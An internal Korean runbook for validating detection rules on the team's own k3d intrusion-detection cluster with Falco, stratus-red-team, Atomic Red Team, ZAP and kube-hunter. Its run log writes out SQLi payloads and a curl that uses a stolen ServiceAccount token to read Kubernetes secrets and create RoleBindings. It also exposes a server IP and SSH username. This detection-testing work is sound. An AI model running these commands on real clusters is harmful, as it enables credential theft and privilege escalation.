# 보안 테스트 도구 (k3d techeer-ids 클러스터용)

설치 위치: GCP VM(`35.216.79.173`)의 `/srv/security-tools/`. 전부 이 VM에서 실행 —
`kubectl`/`docker`/`helm`이 이미 `techeer-ids` k3d 클러스터를 가리키고 있음
(`~/.kube/config`, context `k3d-techeer-ids`).

공통 주의사항:
- 전부 **실제 트래픽/공격을 만드는 도구**라 falco/otel-collector 로그, IDS-COLLECTOR
  incidents 테이블에 실제로 흔적이 남는다. 한 번에 하나씩 실행하고 결과 확인 후 다음으로 넘어갈 것.
- 결과 확인은 공통으로 이 두 가지:
  - `kubectl logs -f -l app=otel-collector -c otel-collector --prefix --max-log-requests=3`
    (log.source별로 실시간 확인)
  - IDS-COLLECTOR 쪽 `incidents` 테이블/대시보드에서 해당 시나리오가 실제 발화하는지 확인

---

## 1. falco-event-generator — Falco 룰 커버리지 테스트

Falco가 감시하는 건 k3d 노드(각 node = 컨테이너) 안에서 도는 파드의 syscall이라, 반드시
**클러스터 안에 pod로 띄워야** Falco가 인식한다 (호스트에서 `docker run`으로 띄우면 안 잡힘).

```bash
# 사용 가능한 액션 전체 목록
kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- list

# 전체 액션을 한 바퀴 실행 (Falco 룰 커버리지 전수 테스트)
kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- run

# 특정 액션만 (예: 컨테이너 탈출 시도 하나)
kubectl run event-generator --image=falcosecurity/event-generator:latest --restart=Never --rm -it -- \
  run syscall.DetectReleaseAgentFileContainerEscapes
```
확인: `kubectl logs -f -l app=falco -n falco -c falco` 또는 otel-collector 로그에서
`log.source: Str(falco)` 레코드.

⚠️ **`run 'A\|B'`(정규식으로 여러 액션을 한 호출에 묶는 형태)는 A/B의 실행 순서를 보장하지
않는다**(2026-07-22 실측 확인, S66/S74/S80에서 증명됨) - `sequence` 타입 시나리오처럼
stage 순서가 중요한 경우, 한 번의 `run` 호출에 정규식으로 묶지 말고 각 액션을 **별도
호출로, 순서대로** 실행할 것(필요하면 동일 pod 이름을 재사용 - 예: S74/S80처럼
`kubectl run <이름> -- run <액션A> && sleep N && kubectl delete pod <이름> && kubectl run <이름> -- run <액션B>`).
반대로 `cardinality` 타입(예: S99/S100/S102, "짧은 시간 안에 서로 다른 신호가 몇 종류
나오는지"만 세는 시나리오)은 순서가 조건에 안 들어가므로 `run 'A\|B\|C'` 한 번으로도
문제없다 - 시나리오 `type`을 먼저 확인하고 고를 것(섹션 8 상단 절차 2번 참고).

---

## 2. stratus-red-team — K8s Audit 레이어(RBAC/자격증명 탈취) 테스트

바이너리: `/usr/local/bin/stratus` (이미 PATH에 있음). 로컬 kubeconfig(k3d-techeer-ids)를
그대로 사용하므로 host에서 바로 실행.

```bash
# Kubernetes 관련 기법 목록 (8개: SA 토큰 탈취, RBAC 상승, privileged pod 등)
stratus list --platform kubernetes

# 기법 상세 설명 (MITRE 매핑, 실제로 뭘 하는지)
stratus show k8s.credential-access.steal-serviceaccount-token

# 실행 (사전 준비 -> 공격 실행 -> 상태 기록까지 한 번에)
stratus detonate k8s.credential-access.steal-serviceaccount-token

# 뒷정리 (반드시 실행 - 안 하면 테스트용 ServiceAccount/ClusterRole이 클러스터에 남음)
stratus cleanup k8s.credential-access.steal-serviceaccount-token

# 여러 개 상태 한눈에
stratus status
```
확인: `k8s-audit-logs/audit.log` 또는 otel-collector 로그의 `log.source: Str(k8s-audit)`.

---

## 3. kube-hunter — 클러스터 취약점 스캔 (recon 갭 확인용)

외부 스캔 모드는 VM/VPC 전체를 훑을 위험이 있어 **반드시 `--pod` 모드**(클러스터 내부에서
자기 자신 기준으로 스캔)로만 실행.

```bash
kubectl run kube-hunter --image=aquasec/kube-hunter:latest --restart=Never --rm -it -- --pod
```

---

## 4. OWASP ZAP — WAS/WAF 레이어 (baseline 스캔, 가벼운 버전)

⚠️ **최초 1회만**: ZAP 컨테이너는 UID 1000(zap)으로 도는데, `/tmp/zap-reports`를 처음
`mkdir`하면 소유자만 쓰기 가능한 권한이라 UID가 다른 서버 계정(예: OS Login 계정은 UID가
1000이 아님)에서 만들면 컨테이너가 리포트 파일을 못 쓴다(`Permission denied: '/zap/wrk/zap.yaml'`
- 2026-07-22 실측 확인). 아래처럼 world-writable로 만들어두면 계정이 달라도 항상 통과함:
```bash
mkdir -p /tmp/zap-reports && chmod 777 /tmp/zap-reports
```

```bash
nohup setsid kubectl port-forward svc/backend 8000:8000 > /tmp/pf-backend.log 2>&1 < /dev/null &
nohup setsid kubectl port-forward svc/juice-shop 3001:3000 > /tmp/pf-juiceshop.log 2>&1 < /dev/null &

docker run --rm --network host -v /tmp/zap-reports:/zap/wrk/:rw zaproxy/zap-stable \
  zap-baseline.py -t http://localhost:8000/proxy/ -r waf-baseline-report.html

docker run --rm --network host -v /tmp/zap-reports:/zap/wrk/:rw zaproxy/zap-stable \
  zap-baseline.py -t http://localhost:3001/ -r was-baseline-report.html

pkill -f 'port-forward svc/backend'; pkill -f 'port-forward svc/juice-shop'
```

---

## 5. Atomic Red Team — 개별 MITRE 기법

`/srv/security-tools/run_atomic.py`로 atomics YAML에서 명령을 뽑아 `kubectl exec`로 파드 안에서
실행. `art-venv`에 Python 3.13 호환성 패치(`attrs` 설치 + `pipes` shim) 이미 적용돼 있음 - 재설치 금지.

```bash
/srv/security-tools/art-venv/bin/python3 /srv/security-tools/run_atomic.py T1082 --list
/srv/security-tools/art-venv/bin/python3 /srv/security-tools/run_atomic.py T1082 --index 0 \
  --pod <backend-pod-이름> --container backend
```
한계: 대상 컨테이너에 `sh`가 있어야 함 (juice-shop 컨테이너는 없음 → backend pod 사용).

---

## 6. 우리 환경 맞춤 선별 결과 (2026-07-21 분석)

시나리오 카탈로그(109개, `servers/correlation-engine/app/scenarios/*.yaml`)의
`mitre_technique_id`를 전부 뽑아 37개 고유 MITRE 기법 ID를 확보하고, 각 도구의 기법과 대조함.

**이미 커버 중인 37개 기법** (회귀검증용 - "잘 잡히는지 재확인" 목적):
T1036, T1046, T1053, T1055, T1059, T1068, T1069, T1070, T1078, T1082, T1087, T1090, T1098,
T1110, T1133, T1136, T1190, T1485, T1489, T1490, T1496, T1499, T1531, T1543, T1547, T1550,
T1552, T1555, T1557, T1562, T1595, T1609, T1610, T1611, T1613, T1620, T1622, T1685

### Atomic Red Team (T-번호가 폴더명이라 정확히 대조 가능)
전체 340개 기법 중 Linux 테스트가 있는 건 121개. 그중 48개는 이미 우리 시나리오가 커버
(회귀검증용), **73개는 시나리오가 아직 없는 갭 후보**. 전체 목록은
`/tmp/analyze_art.py` 실행 결과 참고(서버에 스크립트 남겨둠). 그중 컨테이너 환경에 실제로
맞고(클라우드 API/브라우저/GUI 불필요) 신호 가치가 높은 **우선순위 갭 12개**:

| 기법 | 이름 | 왜 가치 있나 |
|---|---|---|
| T1548.001 / T1548.003 | Setuid/Sudo 악용 | 컨테이너 내부 권한상승 - 현재 PrivEsc 커버리지(T1611 host escape)와 축이 다름, 완전 공백 |
| T1574.006 | LD_PRELOAD 하이재킹 | 클래식 Linux persistence/defense evasion, 완전 공백 |
| T1518.001 | 보안 소프트웨어 탐지 | 공격자가 Falco/모니터링 존재를 확인하는 행위 - 우리 탐지 스택 자체를 노리는 recon, 직접적 가치 |
| T1686 | 방화벽(iptables) 변조 | defense evasion, T1562(Impair Defenses)와 인접하지만 iptables 특정 각도는 공백 |
| T1105 | 외부 도구 다운로드 | 침투 후 1순위 행동(curl/wget으로 추가 툴 반입), 실공격 재현도 높음 |
| T1560.001 / T1560.002 | 수집 데이터 압축(tar/zip) | 유출 전 준비 단계, 공백 |
| T1003.007 / T1003.008 | /proc, /etc/shadow 자격증명 덤프 | 컨테이너 내부 직접 자격증명 탈취, credentials.yaml 계열과 다른 각도 |
| T1546.004 / T1546.005 | bashrc/trap 기반 persistence | 현재 persistence 커버리지(T1543/T1547/T1136)와 벡터가 다름 |
| T1222.002 | 파일/디렉터리 권한 변조 | chmod 777 등 defense evasion, 공백 |
| T1486 | Data Encrypted for Impact | 랜섬웨어 시뮬레이션, resource_abuse/impact 테마 공백 |
| T1690 | 커맨드 히스토리 로깅 방지 | 기존 T1070.003(히스토리 삭제)와 다르게 "애초에 안 남기기" 각도, 공백 |
| T1564.001 | 숨김 파일/디렉터리 | 단순하지만 확실한 defense evasion 공백 |

제외 추천(우리 환경에 안 맞음): 브라우저 관련(T1113/T1115/T1176/T1217), 클라우드 API
필요(T1567.002/T1578.002/T1580) - k8s 안 컨테이너 환경이라 해당 없음.

### stratus-red-team (K8s, 8개)
공식 문서가 정확한 T-번호 대신 태그(Credential Access/Persistence/Privilege Escalation)만
공개해서 ART처럼 정밀 대조는 안 되지만, **8개 전부 우리 클러스터의 실제 K8s API를 그대로
쓰는 기법**이라 환경 적합성 자체는 100%.

⚠️ **2026-07-23 재확인**: 처음엔 "hostPath 하나 빼고 나머지 7개는 전부 대응 시나리오가
없는 갭"이라고 적었는데, 각 기법의 실제 동작(`stratus show`)을 다시 뜯어보니 대부분
**이미 있는 시나리오와 정확히 매치됨** - ART가 커버 못 하는 32개 중 상당수가 사실 stratus로
채워짐:
- `k8s.privilege-escalation.hostpath-volume` → T1611, **이미 커버됨(S16/S52/S69/S75)** → 회귀검증용
- `k8s.credential-access.steal-serviceaccount-token` → **S56과 정확히 일치**(pod 안에서
  `cat .../serviceaccount/token` 실행) - 이 룰 자체가 이 기법을 재현하다 발견돼서 만들어짐
- `k8s.persistence.create-admin-clusterrole` → **S12/S13과 일치**(ClusterRole+SA+ClusterRoleBinding 생성)
- `k8s.persistence.create-token` → **S25와 정확히 일치**(TokenRequest API로 장기 토큰 발급) - 지금까지 32개 미커버 목록에 있었는데 실제로는 커버됨
- `k8s.persistence.create-client-certificate` → **S57과 정확히 일치**(CSR 생성 후 클라이언트 인증서 발급) - 마찬가지로 미커버 목록에서 제외해야 함
- `k8s.privilege-escalation.nodes-proxy` → **S58과 정확히 일치**(`nodes/proxy` 권한으로 권한상승) - 마찬가지로 미커버 목록에서 제외
- `k8s.credential-access.dump-secrets` → S2(자격증명 조회) 계열과 근접하지만 완전히 같은 매치는 아님(S2는 sequence의 stage1일 뿐이라 이 기법 하나로는 완결 안 됨)
- `k8s.privilege-escalation.privileged-pod` → S16/S52와 근접(이미 커버)

즉 실제 갭은 `dump-secrets`/`privileged-pod` 정도이고, 나머지는 이미 커버돼 있었음 -
아래 8-2/9(신규)에 S25/S57/S58을 stratus로 검증할 명령 추가함.

### falco-event-generator / kube-hunter
이 둘은 기법에 T-번호 태그가 없어 위와 같은 정밀 대조는 불가. falco-event-generator는 Falco
룰 이름 기준으로 우리 `backend/falco-values.yaml`의 커스텀 룰과 대조했음(아래 7번 참고).
kube-hunter는 애초에 "특정 기법 재현"이 아니라 "클러스터 설정 취약점 스캔"이라 성격이 다름.

---

## 7. falco-event-generator vs 커스텀 룰 대조 (2026-07-22 분석)

`backend/falco-values.yaml`에 정의된 룰 6개와 event-generator의 전체 액션 30개(고정 목록,
`kubectl run ... -- list`로 확인)를 대조한 결과: **6개 중 하나도 event-generator로 못
건드린다.** event-generator의 30개 액션은 전부 falcosecurity 코어 룰셋(민감 파일 열람,
container escape, ptrace 안티디버그, memfd fileless 실행, AWS credential 탐색 등) 대상으로
설계돼 있어서, 이 프로젝트 전용으로 새로 만든 룰은 애초에 커버 대상이 아님.

| 커스텀 룰 | event-generator 매치 | 대안 |
|---|---|---|
| Account Creation Inside Container (T1136) | 없음 | ✅ **Atomic Red Team T1136.001**로 커버됨 (`useradd` 실행) |
| ServiceAccount Token File Read (T1552) | 없음 | ✅ **stratus-red-team `k8s.credential-access.steal-serviceaccount-token`**로 커버됨 — 이 룰 자체가 그 기법을 재현하다가 발견돼서 만들어짐(파일 주석 참고) |
| Detect outbound connections to common miner pool ports | 없음 | ❌ 5개 도구 전부 커버 안 됨 |
| Detect crypto miners using the Stratum protocol | 없음 | ❌ 도구 커버 안 됨, 단 조건이 `proc.cmdline`에 `stratum+tcp` 문자열 포함 여부라 실제 채굴 연결 없이 `sh -c 'sleep 5 stratum+tcp://test'` 같은 무해한 명령만 실행해도 발화 |
| Known Cryptominer Process Executed | 없음 | ❌ 도구 커버 안 됨, `proc.name`이 `xmrig` 등 목록에 있는지만 봐서 `cp /bin/true /tmp/xmrig && /tmp/xmrig` 같은 더미 스크립트로 안전하게 발화 테스트 가능 |
| Terminal shell in container (core 룰, priority만 override) | 아마 `syscall.RunShellUntrusted` 또는 `helper.RunShell` (event-generator 네이밍상 유력, 100% 확정은 실행해서 확인 필요) | 직접 실행해서 로그 확인 |

정리: 커스텀 룰 6개 중 2개(계정생성/토큰탈취)는 이미 세팅한 다른 도구로 커버되고, 크립토마이닝
3개는 어떤 도구도 못 건드리므로 위 무해한 더미 명령으로 직접 테스트하는 게 제일 빠르고 안전함.

---

## 8. "인정된 도구로 검증했다" 주장을 위한 시나리오 매핑 (2026-07-22)

**목적**: "우리 상관분석 시나리오를 falcosecurity/event-generator·stratus-red-team·Atomic
Red Team·OWASP ZAP 같은 업계에서 통용되는 도구로 검증했다"고 주장하려면, 어느 시나리오를
어느 도구로 트리거했는지 근거가 명확해야 한다. 109개 시나리오의 `mitre_technique_id`를
전부 뽑아 각 도구의 기법과 실제로 대조한 결과:

### 총계: 109개 중 85개(78%)를 인정된 외부 도구로 검증 가능

⚠️ **2026-07-23 갱신**: stratus-red-team 기법 재점검으로 S25/S57/S58이, falco-event-generator
액션 목록 재점검으로 S34/S36/S44/S50/S103이 추가로 확인됨(8개 전부 2026-07-22 실제 실행해서
인시던트 발화까지 확인 완료 - 9-1 참고). ART/ZAP 재검토는 변화 없음 - ART는 남은 기법ID
전부 Linux 테스트 자체가 없고, ZAP은 JWT alg:none 위조나 rate-limit 시그니처를 기본 내장
규칙으로 못 만듦.

| 도구 | 커버 시나리오 수 | 근거 |
|---|---|---|
| Atomic Red Team | 61개 | MITRE 기법 ID가 폴더명이라 정밀 대조(아래 표) |
| stratus-red-team | 7개 | T1611(hostPath 이스케이프) + T1098/T1552(SA 토큰·ClusterRole, S12/S13/S56과 중복) + T1550(S25 토큰 발급)/T1550(S57 CSR 인증서)/T1068(S58 nodes-proxy) |
| OWASP ZAP | 11개 | T1190(웹 공격面 공격) 계열 - WAF 시그니처 탐지 검증 |
| falco-event-generator (신규분만) | 5개 | S34/S36/S44/S50/S103 - 액션 목록에 이미 있었는데 8-5에서 누락 확인됨(2026-07-23) |
| kube-hunter | (ART와 6개 중복) | T1046/T1595/T1087 recon 계열 - 독립된 두 번째 도구로 같은 탐지를 교차검증하는 용도 |
| **합계(중복 제거)** | **85개** | |
| 아직 외부 도구 커버 없음 | 24개 | `dummy_generator.py`로만 테스트 가능 (아래 목록) |

### 8-0. 오늘 실제 실행해서 검증 완료 (2026-07-22)

"인정된 도구로 검증했다"는 주장이 근거 없는 매핑표에 그치지 않도록, 3개 도구(ART/stratus-red-team/OWASP ZAP) 각각으로 **실제 인시던트가 Postgres에 생기는 것까지** 직접 확인함. 전부 `threshold=1`(또는 낮은 threshold) 단일 단계 시나리오로 골라서 별도 stage2 없이 그 자리에서 완결되는 것으로 검증.

| 도구 | 시나리오 | 실행 명령 | 결과 인시던트 | severity | 시각(UTC) |
|---|---|---|---|---|---|
| Atomic Red Team (T1136.001) | S53 (컨테이너 내부 OS 계정 생성) | `run_atomic.py T1136.001 --index 0 --pod <backend-pod> --container backend` | `2fcf7699-8150-4ac8-850c-3b0e75334073` | 4 | 2026-07-22 03:11:19 |
| stratus-red-team | S16 (컨테이너 이스케이프 벡터를 가진 pod 생성) | `stratus detonate k8s.privilege-escalation.hostpath-volume` | `239e80f3-4767-4884-b9ef-056c847a507e` | 4 | 2026-07-22 03:12:29 |
| OWASP ZAP (baseline) | S4 (동일 IP WAF 다발 차단) | `zap-baseline.py -t http://localhost:8000/proxy/ -m 3` | `9add85be-e5ac-4d40-bc63-82ff495b9a1b` | 3 | 2026-07-22 03:15:29 |

검증 방법(각 시나리오의 `matched_scenario_rule_id` UUID로 조회):
```bash
docker exec postgres psql -U ids_admin -d ids_platform -c \
  "SELECT id, title, severity, status, created_at FROM incidents WHERE matched_scenario_rule_id = '<UUID>' ORDER BY created_at DESC LIMIT 3;"
```
UUID는 시나리오 이름으로 먼저 조회:
```bash
docker exec postgres psql -U ids_admin -d ids_platform -t -c \
  "SELECT id FROM scenario_rules WHERE name = '<시나리오 이름>';"
```

**직접 재현/나머지 검증할 때 쓸 공통 절차** (아래 8-1~8-3 표의 나머지 항목들도 이 순서로):
1. 대상 시나리오의 `type`을 YAML에서 먼저 확인 - `threshold`면 1회(또는 threshold 횟수)만 실행하면 됨, `sequence`면 stage1+stage2 둘 다 필요(섹션 8 상단 다단계 경고 참고).
2. 위 명령으로 UUID 조회 → 실행 전 `incidents` 개수/최신 시각을 베이스라인으로 기록.
3. 도구 실행(섹션 1~5의 명령 패턴 그대로).
4. `kubectl logs -n falco <falco-pod> -c falco --since=1m`(falco 소스인 경우) 또는 `docker logs normalizer --since 1m`으로 이벤트가 정규화까지 갔는지 먼저 확인.
5. 위 조회 쿼리로 새 인시던트 행이 생겼는지 확인 - `created_at`이 방금 실행 시각과 맞아야 진짜 검증된 것.

### 8-1. Atomic Red Team → 61개 시나리오

```bash
# 공통 실행 패턴 (섹션 5 참고)
/srv/security-tools/art-venv/bin/python3 /srv/security-tools/run_atomic.py <T-번호> --list
/srv/security-tools/art-venv/bin/python3 /srv/security-tools/run_atomic.py <T-번호> --index N \
  --pod <pod> --container <container>
```

| MITRE 기법 | 대응 시나리오 | ART 기법 ID(실행 시 사용) |
|---|---|---|
| T1036 Masquerading | S51 | T1036.003/.004/.005/.006/.007/.008 |
| T1046 Network Service Discovery | S28, S30, S54, S101 | T1046 |
| T1053 Scheduled Task/Job | S21, S109 | T1053.002/.003/.006 |
| T1055 Process Injection | S40, S80, S100 | T1055.009 |
| T1059 Command/Scripting Interpreter | S32, S35, S41, S42, S43, S74, S102 | T1059.004(Bash, 17개 테스트)/.006(Python) |
| T1069 Permission Groups Discovery | S31, S62 | T1069.001/.002 |
| T1070 Indicator Removal | S23, S64 | T1070.003/.004/.006/.008 |
| T1078 Valid Accounts | S95 | T1078.003 |
| T1082 System Information Discovery | S70 | T1082 |
| T1087 Account Discovery | S79 | T1087.001/.002 |
| T1090 Proxy | S77 | T1090.001/.003 |
| T1098 Account Manipulation | S7, S12, S13, S96 | T1098.004(SSH Authorized Keys) |
| T1110 Brute Force | S19, S26, S83 | T1110.001/.004 |
| T1136 Create Account | S6, S53, S66 | T1136.001/.002 (S53 = falco 커스텀 룰 회귀검증, **✅ 2026-07-22 실증됨 - 8-0 참고**) |
| T1485 Data Destruction | S8, S37, S76 | T1485 |
| T1489 Service Stop | S72 | T1489 |
| T1496 Resource Hijacking | S22, S82 | T1496 (크립토마이닝 falco 룰 회귀검증 - 섹션 7 참고) |
| T1531 Account Access Removal | S106 | T1531 |
| T1543 Create/Modify System Process | S20, S73, S86, S87 | T1543.002 |
| T1547 Boot/Logon Autostart | S81 | T1547.006 |
| T1552 Unsecured Credentials | S2, S18, S38, S39, S56, S89, S93 | T1552(+.001/.003/.004/.005/.007, S56 = falco 커스텀 룰 회귀검증) |
| T1555 Credentials from Password Stores | S45, S46, S47, S48, S49, S99 | T1555.003 (⚠️ 브라우저 필요 - 컨테이너에서 실제 실행은 어려울 수 있음, 확인 필요) |
| T1595 Active Scanning | S92 | T1595.003 |
| T1685 Disable or Modify Tools | S11 | T1685(+.002/.006, 총 31개 테스트로 제일 풍부) |

### 8-2. stratus-red-team → 7개 시나리오

```bash
stratus detonate <기법 ID>
# 확인 후 반드시
stratus cleanup <기법 ID>
```
| MITRE 기법 | 대응 시나리오 | stratus 기법 ID |
|---|---|---|
| T1611 Escape to Host (hostPath) | S16, S52, S69, S75 (**✅ S16 2026-07-22 실증됨 - 8-0 참고**) | `k8s.privilege-escalation.hostpath-volume` |
| T1552 ServiceAccount 토큰 파일 탈취 | S56 (**✅ 2026-07-22 kubectl로 실증, stratus는 동일 행위의 대안** - 9번 표 참고) | `k8s.credential-access.steal-serviceaccount-token` |
| T1098 위험한 RBAC 룰/ClusterRoleBinding | S12, S13 (**✅ 2026-07-22 kubectl로 실증, stratus는 동일 행위의 대안**) | `k8s.persistence.create-admin-clusterrole` |
| T1550 ServiceAccount 토큰 명시적 발급 | **S25 (신규, 아직 미검증 - 아래 9-1 참고)** | `k8s.persistence.create-token` |
| T1550 CSR 기반 클라이언트 인증서 발급 | **S57 (신규, 아직 미검증 - 아래 9-1 참고)** | `k8s.persistence.create-client-certificate` |
| T1068 nodes/proxy 권한상승 | **S58 (신규, 아직 미검증 - 아래 9-1 참고)** | `k8s.privilege-escalation.nodes-proxy` |

(`dump-secrets`, `privileged-pod` 2개는 여전히 정확히 매치되는 단일 시나리오가 없어 회귀검증
목록에서 제외 - 섹션 6 참고)

### 8-3. OWASP ZAP → 11개 시나리오

WAF의 SQLi/XSS/JWT-none 시그니처 탐지(WAF CRITICAL 차단)가 stage1 재료인 시나리오들.
⚠️ 이 중 다수가 **다단계(sequence/cardinality) 시나리오**라 ZAP 스캔 한 번으로 바로 안 터질
수 있음 - `required_modules`/`window_seconds`/`threshold`를 각 YAML에서 먼저 확인할 것.

```bash
docker run --rm --network host -v /tmp/zap-reports:/zap/wrk/:rw zaproxy/zap-stable \
  zap-baseline.py -t http://localhost:8000/proxy/ -r waf-baseline-report.html -m 3
```
(`-m 3`: 스파이더 최대 3분으로 제한 - 안 주면 훨씬 오래 걸림. 리포트 파일 쓰기는 `/tmp/zap-reports`
권한 문제로 실패할 수 있는데 콘솔 출력만으로도 검증엔 충분함 - S4는 SQLi 페이로드가 아니라 스파이더의
빠른 반복 요청 자체가 WAF의 Bad Bot/Rate Limiting 시그니처에 걸려서 발화함, 실측 확인.)
| MITRE 기법 | 대응 시나리오 |
|---|---|
| T1190 Exploit Public-Facing Application | S4, S5, S33, S55, S59, S60, S63, S84, S85, S90, S104 (**✅ S4 2026-07-22 실증됨 - 8-0 참고**) |

### 8-4. kube-hunter → ART와 중복 (교차검증용)

`--pod` 모드 스캔이 T1046(Network Service Discovery)/T1595(Active Scanning)/T1087(Account
Discovery) 계열 행동을 실제로 만들어냄 - S28/S30/S54/S101/S92/S79와 겹치지만, **서로 다른
두 개의 인정된 도구(ART + kube-hunter)로 같은 탐지를 교차검증했다**는 근거를 추가로 만들 수
있어서 "신뢰도" 주장에는 오히려 도움이 됨.

### 8-5. 외부 도구 커버 없음 (24개, dummy_generator.py 전용)

S1, S3, S9, S10, S14, S15, S17, S24, S27, S29, S61, S65,
S67, S68, S71, S78, S88, S91, S94, S97, S98, S105, S107, S108

(S25/S57/S58은 stratus-red-team으로, S34/S36/S44/S50/S103은 falco-event-generator로
2026-07-22 실제 실행까지 확인 완료돼 8-2/9-1로 이동함 - 2026-07-23. 남은 24개는 K8s Audit
전용 CRUD형 threshold/cardinality 시나리오(예: NodePort 노출·TLS 없는 Ingress·ephemeral
container·anonymous 요청·RBAC 변조 T1098/T1609 계열)나 falco 전용(T1610/T1611 조합) 등,
ART/ZAP/event-generator/stratus/kube-hunter 어느 것도 원어 그대로 만들어내는 기법이 없어
`kubectl` 직접 실행만 가능 - "인정된 도구로 검증" 주장에는 못 씀, 사내 dummy_generator.py나
직접 kubectl로만 재현 가능. 단, S3/S105는 이번 stratus/event-generator 테스트를 진행하는
동안 kubectl 사용의 부수효과로 실제로 발화하는 게 관측됨 - 도구 자체가 목표로 삼은 액션은
아니라서 "도구로 검증" 목록엔 안 넣었지만 재현 자체는 매우 쉬움을 시사)

---

## 9. 실행 기록표 (77개 시나리오, 복붙 실행용)

**사용법**: 실행 명령을 그대로 복붙해서 서버(`ssh simdaum98_gmail_com@35.216.79.173`)에서 실행 →
`kubectl logs -n falco <falco-pod> -c falco --since=1m` 또는 `docker logs normalizer --since 1m`으로
이벤트가 정규화됐는지 확인 → 아래 쿼리로 인시던트 생성 확인 → "실행 결과" 칸에 인시던트 UUID나
스크린샷 링크를 채워넣을 것.

```bash
# 시나리오 이름으로 UUID 조회 (한 번만 해두면 재사용 가능)
docker exec postgres psql -U ids_admin -d ids_platform -t -c \
  "SELECT id, name FROM scenario_rules ORDER BY name;"

# 특정 시나리오의 최근 인시던트 확인
docker exec postgres psql -U ids_admin -d ids_platform -c \
  "SELECT id, title, severity, status, created_at FROM incidents WHERE matched_scenario_rule_id = '<UUID>' ORDER BY created_at DESC LIMIT 3;"
```

⚠️ 주의사항:
- ART 명령의 `$(kubectl get pod -l app=backend -o jsonpath='{.items[0].metadata.name}')`는 매번
  현재 backend pod 이름을 자동으로 채워주는 부분 - pod가 재시작돼 이름이 바뀌어도 그대로 복붙하면 됨.
- 전부 `--index 0`(각 기법의 첫 번째 linux 테스트) 기본값으로 골랐음. 실행 전에 `--index 0`을
  빼고(즉 `--pod` 없이) 먼저 실행해서 어떤 명령이 나가는지 미리 보고 싶으면, `--pod ... --container backend`
  부분을 지우고 실행하면 미리보기만 됨(섹션 5 참고).
- T1485(Data Destruction)/T1531(Account Access Removal)/T1489(Service Stop) 계열은 이름 그대로
  "파괴/계정 제거/서비스 중단"류라 backend pod 안에서 부작용이 생길 수 있음(pod 자체는 언제든
  `kubectl delete pod`로 재생성 가능하니 치명적이진 않지만) - 실행 전에 `--list`로 정확히 뭘 하는
  테스트인지 한 번 확인 권장.
- stratus 실행 후에는 반드시 `stratus cleanup k8s.privilege-escalation.hostpath-volume`로 뒷정리할 것
  (안 하면 테스트용 리소스가 클러스터에 남음).
- ZAP 명령은 먼저 `mkdir -p /tmp/zap-reports && chmod 777 /tmp/zap-reports`(권한 문제 방지, 섹션 4 참고)와
  `nohup setsid kubectl port-forward svc/backend 8000:8000 > /tmp/pf-backend.log 2>&1 < /dev/null &`
  로 port-forward를 띄워둬야 함(섹션 4 참고). S4/S5/S33/S55/S59/S60/S63/S84/S85/S90/S104 전부 같은
  스캔 한 번으로 동시에 발화 시도됨(WAF 계층 전체를 건드리는 스캔이라) - 11번 따로 돌릴 필요 없이
  한 번 돌리고 11개 UUID를 전부 조회해보면 됨.

| 도구 | 시나리오 | 실행 명령 | 실행 결과 |
|---|---|---|---|
| OWASP ZAP | S104 | `docker run --rm --network host -v /tmp/zap-reports:/zap/wrk/:rw zaproxy/zap-stable zap-baseline.py -t http://localhost:8000/proxy/ -r waf-baseline-report.html -m 3` | ✅ 완료(2026-07-22) severity 3 - ZAP 스캔 1회로 동일 IP에서 3종 이상 다른 공격 유형이 자동 발생 |
| OWASP ZAP | S33 | `docker run --rm --network host -v /tmp/zap-reports:/zap/wrk/:rw zaproxy/zap-stable zap-baseline.py -t http://localhost:8000/proxy/ -r waf-baseline-report.html -m 3` | ✅ 완료(2026-07-22) severity 3 - CORS 스캔 규칙이 자동으로 cors_abuse 유발 |
| OWASP ZAP | S4 | `docker run --rm --network host -v /tmp/zap-reports:/zap/wrk/:rw zaproxy/zap-stable zap-baseline.py -t http://localhost:8000/proxy/ -r waf-baseline-report.html -m 3` | ✅ 완료(2026-07-22) - 인시던트 `9add85be-...` severity 3 |
| curl + kubectl exec | S5 | SQLi POST 페이로드를 juice-shop 경유 경로로 전송(`'password':\"' OR 1=1--\"`) 직후 juice-shop pod 안에서 `curl --cacert .../ca.crt -H "Authorization: Bearer $(cat .../token)" https://kubernetes.default.svc/api/v1/namespaces/default/secrets` (Falco "Contact K8S API Server From Container" 룰이 안정적으로 발화 - "Terminal shell in container"보다 재현이 쉬움) | ✅ 완료(2026-07-22) severity 4 - 최초엔 backend pod로 시도해 실패, juice-shop pod(WAF의 실제 orchestrator 대상)로 재시도 후 발화 확인 |
| OWASP ZAP | S55 | `docker run --rm --network host -v /tmp/zap-reports:/zap/wrk/:rw zaproxy/zap-stable zap-baseline.py -t http://localhost:8000/proxy/ -r waf-baseline-report.html -m 3` | ✅ 완료(2026-07-22) severity 3 |
| curl + kubectl exec | S59 | S5와 동일하게 juice-shop pod에서 WAF sqli → K8s API contact(Falco) → 토큰 파일 읽기(Falco) → TokenRequest API 호출(`POST .../serviceaccounts/default/token`) → RoleBinding 생성 API 호출, 전부 훔친 SA 토큰으로 인증 | ✅ 완료(2026-07-22) severity 4 - 5단계 전부 juice-shop pod의 실제 SA(`system:serviceaccount:default:default`)로 인증한 뒤 발화 확인. 초기엔 내 kubectl(system:admin 신원)로 잘못 테스트해서 실패했었음 - 실제 공격자는 훔친 토큰으로 API를 호출하지 자기 kubeconfig를 쓰지 않는다는 점을 반영해 재시도 |
| curl (직접) | S60 | `curl -X POST http://localhost:8000/proxy/rest/user/login -d '{"email":"a","password":"'"'"' OR 1=1--"}' -H 'Content-Type: application/json'` 직후 `curl "http://localhost:8000/proxy/rest/products/search?q='("` (500 유발) | ❌ 2026-07-22 시도 - WAF(stage1, join_key=127.0.0.1)와 WAS(stage2, join_key=10.42.2.239) 이벤트가 서버 localhost에서 curl로 보낼 경우 서로 다른 source_ip로 기록되어 join 실패, 외부 공인 IP에서 재시도 필요(로컬 재현 한계로 문서화) |
| curl (직접) | S63 | `curl -H 'Origin: http://evil.example.com' http://localhost:8000/proxy/rest/user/whoami` 직후 `curl http://localhost:8000/proxy/rest/user/whoami` | ❌ 2026-07-22 시도 - S60과 동일한 원인(WAF/WAS source_ip 불일치)으로 시퀀스 미완성, 두 요청 각각의 개별 조건(CORS 위반, 200 응답)은 충족 확인 |
